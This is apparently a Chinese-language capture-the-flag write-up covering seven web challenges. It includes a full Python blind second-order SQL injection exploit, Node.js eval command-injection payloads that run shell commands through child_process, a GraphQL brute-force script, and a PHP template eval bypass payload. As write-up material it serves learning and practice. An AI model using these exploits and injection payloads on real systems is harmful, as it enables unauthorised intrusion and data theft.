<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="1da21e000ca7ed58807965c069018745">前言</h3>
<p>竞技赛持续了7天，为了肝题也是7天没有睡好觉，不过这个比赛也学到很多，在这里比心出题师傅和客服师傅们，比赛真的办的很用心。这次总共16道Web题，最后肝出了11道，6道一血，1道三血。WP尽量具体，把我整个做题过程的思路带上。希望能给大家带来帮助~</p>
<h3 data-content="1" id="d48ca1583d70919b3585b48d2956c0b8">1.给赵总征婚（300 points）</h3>
<p>考点：爆破密码</p>
<p>解题步骤：</p>
<p>1.用源码提示的<strong>rockyou</strong>字典爆破<strong>admin</strong>的密码即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028201129-12522416-f97c-1.png"/></p>
<h3 data-content="1" id="2045efd68378ff51bad1064181ff1499">2.NSB Reset Password（300 points）</h3>
<p>考点：Session</p>
<p>解题步骤：</p>
<p>1.打开靶机，发现跟上一题征婚相比，多了一个注册功能，随便注册一个账号登陆</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028201424-7ab161ac-f97c-1.png"/></p>
<p>2.还有个<strong>重置密码</strong>的页面排除上一题爆破密码的可能，猜测这题需要重置<strong>admin</strong>的密码</p>
<p>3.重置密码需要通过一个<strong>验证码校验</strong>，验证码是通过发送邮箱获得，但是我们不知道admin的邮箱</p>
<p>4.另外发现，删了cookie后，原来的账号就不存在了，说明，这题是根据<strong>session</strong>来判断当前用户的，那么就可以猜想，如果我们一开始去修改我们注册的用户，然后利用自己邮箱的验证码通过验证，再用另一个页面同样的<strong>session</strong>去重置admin，而当前重置的密码根据session判断我们要修改的用户（此时已经变成了admin），所以即可成功修改admin的密码</p>
<p>5.重置密码后登陆admin获得flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028201553-afd599fc-f97c-1.png"/></p>
<h3 data-content="1" id="67064bbf7e698b738a2f0938e3ee7a33">3.Twice_injection(500 points)</h3>
<p>考点：二次注入，mysql5.7特性</p>
<p>解题步骤：</p>
<p>1.打开靶机，发现环境是sql-labs 第24关，注入点在<strong>pass_change.php</strong>的修改密码处的用户名字段，因为是直接从Session中取出后拼接到update语句中，从而造成二次注入</p>
<p>2.按照sql-labs的做法，修改admin用户密码，登陆后发现没有flag，说明flag在数据库中</p>
<p>3.布尔盲注，盲注payload：</p>
<div class="highlight"><pre><span></span><span class="n">admin</span><span class="s1">' and ascii(substr(database(),</span><span class="si">%d</span><span class="s1">,1))=</span><span class="si">%d</span><span class="s1">#</span>
</pre></div>
<p>在username字段后构造条件语句，如果条件为真，则修改密码成功，为假则修改密码失败</p>
<p>4.注出数据库名：<strong>security</strong>，在尝试注表时发现关键字<strong>or</strong>被过滤了，所以不能使用<strong>information_schema</strong></p>
<p>5.注版本信息发现mysql版本为<strong>5.7</strong>，所以可以利用自带的<strong>mysql</strong>库中新增的<strong>innodb_table_stats</strong>这个表，来获得数据库名和表名，参考：<a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></p>
<p>6.注表名payload：</p>
<div class="highlight"><pre><span></span><span class="k">admin</span><span class="err">'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="o">%</span><span class="n">d</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=%</span><span class="n">d</span><span class="o">#</span>
</pre></div>
<p>7.获得<strong>fl4g</strong>表：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028202657-3b9713fc-f97e-1.png"/></p>
<p>8.最后获取flag的exp：</p>
<pre><code>import requests

index_url = "http://101.71.29.5:10002/index.php"
login_url = "http://101.71.29.5:10002/login.php"
pass_change_url = "http://101.71.29.5:10002/pass_change.php"
register_url = "http://101.71.29.5:10002/login_create.php"
s = requests.Session()
database = ""#mysql,security,sys
version = "5.7.27"
table_name = "emails,referers,uagents,users" #gtid_executed,fl4g,sys

for i in range(1,50):
    for j in range(44,128):
        register_data = {
            "username":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
            "password":"123",
            "re_password":"123",
            "submit":"Register"
        }
        r1 = s.post(register_url,data=register_data)
        login_data = {
            "login_user":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
            "login_password": "123",
            "mysubmit": "Login"
        }
        r2 = s.post(login_url,data=login_data)
        pass_change_data = {
            "current_password": "123",
            "password": "somnus1" + str(i),
            "re_password": "somnus1" + str(i),
            "submit": "Reset"
        }
        r3 = s.post(pass_change_url, data=pass_change_data)
        if "Password successfully updated" in r3.text:
            database = database + chr(j)
            print database
            break</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028202759-60c136c6-f97e-1.png"/></p>
<h3 data-content="1" id="9cb8876d764a702b834d413a248c0441">4.checkin(600 points)</h3>
<p>考点：nodejs注入</p>
<p>解题步骤：</p>
<p>1.打开靶机，发现是一个websocket的js网站，/js/app.03bc1faf.js中可以看到源码</p>
<p>2.根据提示，需要我们先输入<strong>/name nickname</strong>来进行登陆，登陆后，审计源码发现可以执行一个calc操作</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028202843-7b09d6fa-f97e-1.png"/></p>
<p>3.执行<code>/calc 5*6</code> 发现返回30，猜测这里存在命令执行，参考：<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank">Node.js代码审计之eval远程命令执行漏洞</a></p>
<p>4.调用<strong>child_process</strong>模块执行命令，题目过滤了空格，用<code>$IFS</code>替代</p>
<p>5.执行ls：</p>
<pre><code>/calc require("child_process").execSync("ls$IFS/").toString()</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028203233-041e36e8-f97f-1.png"/></p>
<p>6.cat flag：</p>
<pre><code>/calc require("child_process").execSync("cat$IFS/flag").toString()</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028203309-19761aba-f97f-1.png"/></p>
<h3 data-content="1" id="659e30f316ffb96aaced43d01fee06c3">5.简单的备忘录(800 points)</h3>
<p>考点：graphql</p>
<p>解题步骤：</p>
<p>1.打开靶机，有个链接，访问发现是一个<strong>graphql</strong>的查询接口</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028203339-2b176648-f97f-1.png"/></p>
<p>2.通过<a href="https://github.com/prisma-labs/get-graphql-schema" target="_blank">get-graphql-schema</a>工具将graphql模式都一一列举出来：</p>
<pre><code>$get-graphql-schema http://101.71.29.5:10012/graphql</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028204532-d4562d1a-f980-1.jpg"/></p>
<p>3.摸清层次后，进行层层<strong>嵌套查询</strong>：</p>
<pre><code>{
  allUsers {
    edges {
      node {
        id
        username
        memos{
          pageInfo {
            hasPreviousPage
            hasNextPage
            startCursor
            endCursor
          }
          edges{
            node{
              id
              content
            }
          }
        }
      }
      cursor
    }
  }
}</code></pre>
<p>4.flag就在<strong>Meno</strong>类的<strong>content</strong>字段中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028204644-ff8a2b44-f980-1.png"/></p>
<h3 data-content="1" id="f3180855ad70377dff683a64677e80ca">6.加密的备忘录(1000 points)</h3>
<p>考点：graphql，unicode变形编码还原</p>
<p>解题步骤：</p>
<p>1.打开靶机，源码提示我们：</p>
<pre><code>&lt;!--     GraphQL 真方便       All your base are belong to us!!!!!      --&gt;</code></pre>
<p>2.访问一下，还是有graphql接口，只是没有像上一题那样写一个界面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028204719-143ef2ea-f981-1.png"/></p>
<p>3.同样用<strong>get-graphql-schema</strong>列出结构：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028204823-3a20c164-f981-1.jpg"/></p>
<p>4.相比于上一题，发现<strong>Query</strong>类中多了一个方法<strong>checkPass</strong>，类<strong>Memo_</strong>也多了一个成员属性<strong>password</strong>，我们同样用上一关的payload来查询一下结果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205144-b21353e4-f981-1.png"/></p>
<p>5.查询结果发现，相比于之前那题，<strong>content</strong>字段和多出来的<strong>password</strong>字段的值看起来像是经过<strong>unicode</strong>编码，将password字段值拿去unicode解码,发现是一串很奇怪的汉字</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205220-c79911c2-f981-1.png"/></p>
<p>6.想到还有一个方法<strong>checkPass</strong>没试，于是构造一下数据包：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205241-d3d5d8c6-f981-1.png"/></p>
<p>从查询结果来分析，我们输入的<strong>password：1</strong>貌似经过了unicode编码后，返回告诉我们这个密码查询结果为空</p>
<p>7.把1经过unicode编码后的字符串：\u4e3a\u6211\u7231\u7231，再次拿去解码，又是一串看不懂的中文：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205354-ffb25c4e-f981-1.png"/></p>
<p>8.而如果我们直接把前面查的password字段中的字符串拿来查询，结果出现整形溢出而报错</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205437-192c3dc0-f982-1.png"/></p>
<p>9.所以猜测：这个<strong>checkPass</strong>方法会将我们查询的password值进行一次变形的unicode编码后，进行查询，那么，我们就需要将password字段值进行还原明文的操作。通过测试发现，可以进行<strong>逐位爆破</strong>明文，现在我们要破解的是password密文：</p>
<pre><code>\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231</code></pre>
<p>那么，首先先对第一个密文字符串：<strong>\u8981</strong>进行解密</p>
<p>首先爆破第一位明文：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205516-3095c602-f982-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205532-3a29d3c0-f982-1.png"/></p>
<p>爆破发现，第一个明文范围可能为<strong>[H-K]</strong></p>
<p>第二个明文，就根据第一个明文的可能来列举爆破，看看是否符合最前面两串密文字符串：<strong>\u8981\u6709</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205605-4dea5e16-f982-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205703-703ad482-f982-1.png"/></p>
<p>发现，第一个明文字符为<strong>H</strong>时，第二个明文字符为<strong>[a-o]</strong>，前两串密文都满足：<strong>\u8981\u6709</strong></p>
<p>由此确定，第一个明文字符为：<strong>H</strong></p>
<p>以此类推，根据checkPass返回的结果来逐位爆破出明文</p>
<p>10.按照这个思路，编写爆破exp，代码如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://101.71.29.5:10037/graphql"</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">"{}"</span>

<span class="n">password</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231</span><span class="s2">"</span>
<span class="c1">#password = "\u5230\u5e74\u79cd\u6210\u5230\u5b9a\u8fc7\u6210\u4e2a\u4ed6\u6210\u4f1a\u4e3a\u800c\u65f6\u65b9\u4e0a\u800c\u5230\u5e74\u5230\u5e74\u4ee5\u53ef\u4e3a\u591a\u4e3a\u800c\u5230\u53ef\u5bf9\u65b9\u751f\u800c\u4ee5\u5e74\u4e3a\u6709\u5230\u6210\u4e0a\u53ef\u6211\u884c\u5230\u4ed6\u7684\u9762\u4e3a\u4eec\u65b9\u7231"</span>
<span class="n">find_password</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">change_password</span> <span class="o">=</span> <span class="s2">""</span><span class="c1">#HappY4Gr4phQL</span>
<span class="n">pass_list</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"\u"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"query"</span><span class="p">:</span><span class="s2">"{</span><span class="se">\n</span><span class="s2">  checkPass(memoId: 1, password:</span><span class="se">\"</span><span class="si">%s</span><span class="se">\"</span><span class="s2">)</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span>
<span class="n">query</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"Content-Type"</span><span class="p">:</span><span class="s2">"application/json"</span>
<span class="p">}</span>

<span class="k">while</span> <span class="n">find_password</span> <span class="o">!=</span> <span class="n">password</span><span class="p">:</span>
    <span class="n">possible_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">end</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">query</span> <span class="o">%</span> <span class="p">(</span><span class="n">change_password</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">s1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s1</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span> <span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">message</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">"'(.*)' not"</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">message_list</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"\u"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">])</span> <span class="ow">and</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="ow">and</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]):</span>
            <span class="n">change_password</span> <span class="o">=</span> <span class="n">change_password</span> <span class="o">+</span> <span class="n">i</span>
            <span class="n">end</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="k">break</span>
        <span class="k">elif</span> <span class="n">message_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">]:</span>
            <span class="n">possible_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">end</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">change_password</span>
        <span class="k">break</span>
    <span class="c1">#print possible_list</span>
    <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">poss1_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">possible_list</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">query</span> <span class="o">%</span> <span class="p">(</span><span class="n">change_password</span><span class="o">+</span><span class="n">j</span><span class="o">+</span><span class="n">z</span><span class="p">)</span>
            <span class="n">s1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
            <span class="n">r1</span> <span class="o">=</span> <span class="n">s1</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
            <span class="n">message</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">"'(.*)' not"</span><span class="p">,</span> <span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
            <span class="n">message_list</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"\u"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">])</span> <span class="ow">and</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="ow">and</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]):</span>
                <span class="n">end</span> <span class="o">=</span> <span class="mi">1</span>
                <span class="k">break</span>
            <span class="k">elif</span> <span class="n">message_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">]:</span>
                <span class="n">poss1_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">poss1_list</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">change_password</span> <span class="o">=</span> <span class="n">change_password</span> <span class="o">+</span> <span class="n">j</span>
            <span class="k">if</span> <span class="n">end</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">change_password</span> <span class="o">=</span> <span class="n">change_password</span> <span class="o">+</span> <span class="n">z</span>
            <span class="n">find_password</span> <span class="o">=</span> <span class="n">find_password</span> <span class="o">+</span> <span class="s2">"\u"</span> <span class="o">+</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">end</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">end</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">change_password</span>
        <span class="k">break</span>
    <span class="c1">#print poss1_list</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">poss1_list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">change_password</span>
        <span class="k">continue</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">poss1_list</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                <span class="n">payload</span> <span class="o">=</span> <span class="n">query</span> <span class="o">%</span> <span class="p">(</span><span class="n">change_password</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="n">m</span><span class="p">)</span>
                <span class="n">s1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
                <span class="n">r2</span> <span class="o">=</span> <span class="n">s1</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
                <span class="n">message</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">"'(.*)' not"</span><span class="p">,</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
                <span class="n">message_list</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"\u"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">])</span> <span class="ow">and</span> <span class="p">(</span><span class="n">message_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]):</span>
                    <span class="n">change_password</span> <span class="o">=</span> <span class="n">change_password</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="n">m</span>
                    <span class="n">find_password</span> <span class="o">=</span> <span class="n">find_password</span> <span class="o">+</span> <span class="s2">"\u"</span> <span class="o">+</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"\u"</span> <span class="o">+</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"\u"</span> <span class="o">+</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
                    <span class="n">end</span> <span class="o">=</span> <span class="mi">1</span>
                    <span class="k">break</span>
            <span class="k">if</span> <span class="n">end</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">2</span>
        <span class="k">print</span> <span class="n">change_password</span>
        <span class="k">print</span> <span class="n">find_password</span>
</pre></div>
<p>11.跑出的密码是：<strong>HappY4Gr4phQL</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205806-95e67420-f982-1.png"/></p>
<p>检查一下是否正确：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205836-a7acb458-f982-1.png"/></p>
<p>12.查询结果为true，说明正确，但是，没有返回flag，这时候突然想到，<strong>content</strong>字段中也有一串密文，按照上题来看，flag估计就是content字段的明文值了，于是继续爆破<strong>content</strong>字段密文</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028205909-bb540024-f982-1.png"/></p>
<p>13.最后跑出flag</p>
<h3 data-content="1" id="af065a0b5fe00b3b12c2fb6d4a9d9725">7.审计一下世界上最好的语言吧（1000 points）</h3>
<p>考点：代码审计，命令执行</p>
<p>解题步骤：</p>
<p>1.下载www.zip，审计源码</p>
<p>2.漏洞触发点很明显，只有一个，在<strong>parse_template.php</strong>的<strong>parseIf</strong>函数中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210154-1db42dc0-f983-1.png"/></p>
<p>分析发现，该函数对传入的参数<strong>$content</strong>进行<code>{if:(.*?)}(.*?){end if}</code>规则的正则匹配，将匹配的结果的第一个元素，即<code>{if:(.*?)}的(.*?)</code>匹配字符串拼接到<strong>eval</strong>函数中<strong>执行命令</strong></p>
<p>3.接着找找哪里调用了<strong>parseIf</strong>函数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210440-80a4b832-f983-1.png"/></p>
<p>在<strong>parse_template.php</strong>的<strong>parse_again</strong>函数的末尾，调用了该函数，继续跟踪，就发现在<strong>index.php</strong>的最后，调用了<strong>parse_again</strong>函数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210510-926a8b14-f983-1.png"/></p>
<p>4.接下来，就是想办法让输入的参数符合条件，来执行<strong>parse_again</strong>函数，进而执行<strong>parseIf</strong>函数，触发漏洞</p>
<p>5.首先看下全局过滤：<strong>common.php</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210546-a80fe356-f983-1.png"/></p>
<p>全局文件<strong>common.php</strong>对GET，POST，COOKIE中的参数进行了进行了<strong>check_var</strong>的检查，过滤了关键字：<strong>_GET，_POST，GLOBALS</strong>，然后，进行了<strong>变量覆盖</strong>的操作</p>
<p>6.所以执行<strong>parse_again</strong>函数的条件，就是<strong>content</strong>参数符合正则匹配：<code>&lt;search&gt;(.*?)&lt;\/search&gt;</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210634-c4a139de-f983-1.png"/></p>
<p>也就是说，我们随便传个参数<code>?content=&lt;search&gt;123&lt;/search&gt;</code>就可以执行<strong>parse_again</strong></p>
<p>7.然后重点审计parse_again函数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210703-d59e565e-f983-1.png"/></p>
<p>该函数处理过程大致是：对传入的<strong>searchnum</strong>，<strong>type</strong>，<strong>typename</strong>和index.php中一开始传入的参数<strong>content</strong>，进行一个<strong>RemoveXSS</strong>的过滤，该函数过滤了大部分关键字：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210734-e874bf5c-f983-1.png"/></p>
<p>其中就包括了<strong>parseIf</strong>函数中匹配的关键字：<strong>if:</strong></p>
<p>过滤后，截取前20个字符，进行<strong>template.html</strong>模板文件的标签替换，最后触发<strong>parseIf</strong>，通过<strong>eval</strong>执行模板文件中符合<code>{if:(.*?)}(.*?){end if}</code>正则匹配的第一个结果字符串</p>
<p>如果我们输入的参数包含<code>{if:</code>，经过<strong>RemoveXSS</strong>处理后就变成了<code>{if&lt;x&gt;</code>:，那么必然就不符合后面的匹配</p>
<p>所以，我们首先需要想办法来绕过<strong>RemoveXSS</strong>的过滤</p>
<p>我们可以发现，在<strong>RemoveXSS</strong>的过滤和执行<strong>parseIf</strong>的中间，还进行了4次的<strong>str_replace</strong>函数的替换，那么，我们就可以利用替换，来绕过过滤，比如我们传入：</p>
<pre><code>?content=&lt;search&gt;{i&lt;haha:type&gt;f:phpinfo()}{end if}&lt;/search&gt;</code></pre>
<p>因为type参数为空，所以最后传入parseIf函数的内容就包括：</p>
<pre><code>&lt;search&gt;{if:phpinfo()}{end if}&lt;/search&gt;</code></pre>
<p>就能成功匹配了，但是，这里还有长度20的限制，所以，我们可以通过多次替换，来绕过限制</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210905-1e8097ba-f984-1.png"/></p>
<p>在模板文件中，存在一处可以让我们通过拼接来凑成<code>{if:(.*?)}(.*?){end if}</code>匹配结构的地方</p>
<p>8.传入payload：</p>
<pre><code>?content=?content=&lt;search&gt;{i{haha:type}&lt;/search&gt;&amp;searchnum={end%20if}&amp;type=f:phpinfo()}</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028210958-3e13613e-f984-1.png"/></p>
